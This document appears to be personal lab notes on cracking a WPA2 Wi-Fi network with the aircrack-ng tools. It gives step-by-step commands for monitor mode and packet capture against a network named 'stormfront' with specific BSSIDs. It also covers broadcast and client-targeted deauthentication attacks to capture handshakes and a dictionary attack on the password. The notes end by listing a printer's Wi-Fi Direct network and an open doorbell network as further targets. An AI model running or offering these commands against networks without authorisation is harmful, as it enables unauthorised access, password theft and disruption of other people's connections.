--INIT SETUP
- start computer, do iwconfig. This should pop up with wlan0 (Our on board adapter)
- plug in the alfa
- the alfa should show up as wlan1
- kill proccesses using 'sudo airmon-ng check kill'. This will make sure nothing interferes with our adapter
- do 'sudo airmon-ng start wlan1' This will enable monitor mode
- do 'airodump-ng wlan1' This will show all available networks


--Airodump/gathering info
- For us there are 2 BSSIDS with the ESSID of stormfront 
	- BC:DF:58:EC:6E:C7  -25        7        5    1  11  360   WPA2 CCMP   PSK  stormfront
	- BC:DF:58:EC:32:5E  -27       21       15    0   6  130   WPA2 CCMP   PSK  stormfront
- We will try both using airodump
-  the first is on channel 11 so we will specify that in the command
	- sudo airodump-ng wlan1 --channel 11 --bssid BC:DF:58:EC:6E:C7 -w targ1  
- we will also execute this command in a folder designated for its output. In this case we will start with 'stormfront-1'
- after a while EAPOL may pop up, this is good because it means we sniffed a wifi sign in


--GRaph and Network Analysis
- now that we have a .csv output file from airodump we will make a graph to look at a primitive yet important network topology
	- sudo airgraph-ng -i targ1-01.csv -o targ1graph.png -g CAPR
	
	
--Aireplay attack
- Now we are going to attack the network, specifically we are trying to gain as many frames and or acks as we can to allow us to eventually try and crack the wifi password.
- to start, we will try a deauth attack specifying our target AP (targ1) mac address.
	- sudo aireplay-ng --deauth 100 -a BC:DF:58:EC:6E:C7 wlan1
- this should broadcast deauth codes to the entire network (FF:FF:FF:FF:FF:FF)
- this is good but not the most effective way to get ACKs
- to be more effective we will look at our airodump again and see which device had the most frames
- looks like it was "24:F5:A2:F5:1F:6B" so we will specify that in our new command using the -c flag
	- sudo aireplay-ng --deauth 100 -a BC:DF:58:EC:6E:C7 -c 24:F5:A2:F5:1F:6B wlan1
- This command should give us plenty of ACKs
	

--Aircrack
- Finally we will take our output and attempt to crack the wifi password
- we will do a doctionary attack to start
	- sudo aircrack-ng -w wifite.txt -b BC:DF:58:EC:6E:C7 targ1-01.cap
- this didnt work so we will append the command with -e (for essid) to see if that helps



- The initial wifi password cracking did not work so we are going to run aireplay and airodump at the same time for a better cap

Important Commands
- 'sudo airmon-ng stop wlan1'
	- Stops monitor mode
- 'systemctl restart NetworkManager'


- setting up kismet
We need to set up kismet

9Provide quick linux setuop instructionsi forgot to write down



talk about wiring up the GPS adapter

done



Printer Hack
- Airodump on printer
- DIRECT-65-HP OfficeJet Pro 6960
- channel 6
- BSSID: B0:0C:D1:04:6D:66

Open wifi
- Essid: Skybell_68947876
- Bssid: 9C:54:DA:0F:C7:DF
- Channel 6
